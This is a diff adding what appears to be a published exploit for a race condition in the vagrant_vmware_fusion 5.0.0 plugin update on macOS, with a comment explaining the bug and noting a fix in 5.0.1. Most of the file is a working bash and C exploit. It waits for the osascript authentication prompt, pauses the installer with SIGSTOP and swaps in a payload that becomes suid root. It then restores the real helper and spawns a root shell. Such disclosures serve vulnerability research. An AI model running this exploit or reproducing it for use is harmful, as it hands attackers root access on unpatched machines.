@@ -1,0 +1,108 @@
+# After three CVEs and multiple exploits disclosed to Hashicorp they have finally upped their game with this plugin. Now the previously vulnerable non-root-owned
+# ruby code that get executed as root by the sudo helper is no more and the sudo helper itself is one static Go binary with tightly-controlled parameters that
+# can't (as far as I can tell) be exploited on its own.
+
+# However I have discovered that the update mechanism in 5.0.0 is not completely safe. There is a bug in the update mechanism for 5.0.0 that makes it reinstall
+# the plugin when you run:
+
+# $ vagrant plugin update
+
+# even if there is no update pending. The reinstall includes replacing the sudo helper and re-applying root ownership and the suid bit. This is done via
+# osascript with a block of shell as an easy way to show a graphical popup authentication dialog to the user.
+
+# After the credentials are entered and the permissions are applied the installer for the plugin immediately checks the hash of the sudo helper binary and if it
+# doesn't match it removes it. On the surface this seemed to make a race condition impossible however after some poking around I found a way to exploit it.
+
+# Because the authentication prompt is a guarantee of at least a few seconds pause in the intallation, we can catch this point in time very easily by scanning the
+# process list watching for the invocation of osascript. Once we see this we can lay a trap by replacing the sudo helper binary with an exploit payload (remember
+# this is always in a non-root-owned directory).
+
+# As soon as the privileges are set vagrant will execute its checksum and remove the payload, however because we've caught execution at the right time and
+# because the installer is a different process from the osascript process we can send a STOP signal to the installer to pause its execution. This means osascript
+# will set the permissions and then the installer will not immediately remove the binary, giving us time to move our newly suid-root'd payload out of the way, use
+# it to obtain root privileges, and then move the real sudo helper back into place and chmod +s it ourselves so that vagrant doesn't realise anything bad has
+# happened.
+
+# This all takes place in a second or two so the user is unlikely to notice either. Once this is done we simply send a CONT signal to the installer to allow
+# it to continue as normal. The plugin is installed correctly with the right permissions, the user didn't see any errors or warnings, and we have an suid
+# root payload that we can execute to spawn a root shell.
+
+# This issue is fixed in version 5.0.1.
+
+# https://m4.rkw.io/vagrant_vmware_privesc_5.0.0.sh.txt
+# cdbdf9e620eba0d897a3ef92b6872dbb0b194eaf548c23953a42678a566f71f0
+# -------------------------------------------------------------------------------
+#!/bin/bash
+echo "########################################"
+echo "vagrant_vmware_fusion 5.0.0 root privesc"
+echo "by m4rkw"
+echo "########################################"
+echo
+echo "compiling..."
+
+cat > vvf.c <<EOF
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+int main(int ac, char *av[])
+{
+  setuid(0);
+  seteuid(0);
+  if (ac > 1) {
+    system("chown root vagrant_vmware_desktop_sudo_helper_darwin_amd64");
+    system("chmod 4755 vagrant_vmware_desktop_sudo_helper_darwin_amd64");
+    return 0;
+  }
+  system("rm -f /tmp/vvf_exp");
+  execl("/bin/bash","bash",NULL);
+  return 0;
+}
+EOF
+
+gcc -o /tmp/vvf_exp vvf.c
+rm -f vvf.c
+
+echo "waiting for user to initiate vagrant plugin update..."
+
+while :
+do
+  r=`ps auxwww |grep '/usr/bin/osascript -e do shell script' |grep 'vagrant_vmware_desktop_sudo_helper_darwin_amd64'`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+done
+
+pid=`ps auxww |grep './vagrant-vmware-installer_darwin_amd64' |grep -v grep |xargs -L1 |cut -d ' ' -f2`
+
+echo "pausing installer..."
+
+kill -STOP $pid
+
+cd $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.0/bin
+
+echo "dropping payload in place of sudo helper binary..."
+
+mv -f vagrant_vmware_desktop_sudo_helper_darwin_amd64 vagrant_vmware_desktop_sudo_helper_darwin_amd64.orig
+mv -f /tmp/vvf_exp vagrant_vmware_desktop_sudo_helper_darwin_amd64
+
+echo "waiting for suid..."
+
+while :
+do
+  r=`ls -la vagrant_vmware_desktop_sudo_helper_darwin_amd64 |grep -- '-rwsr-xr-x' |grep root`
+  if [ "$r" != "" ] ; then
+    echo "moving the real helper back into place..."
+    mv -f ./vagrant_vmware_desktop_sudo_helper_darwin_amd64 /tmp/vvf_exp
+    mv -f vagrant_vmware_desktop_sudo_helper_darwin_amd64.orig vagrant_vmware_desktop_sudo_helper_darwin_amd64
+
+    echo "fixing perms..."
+    /tmp/vvf_exp 1
+
+    echo "allow vagrant to continue..."
+    kill -CONT $pid
+
+    echo "spawning shell..."
+    /tmp/vvf_exp
+    exit 0
+  fi
+done
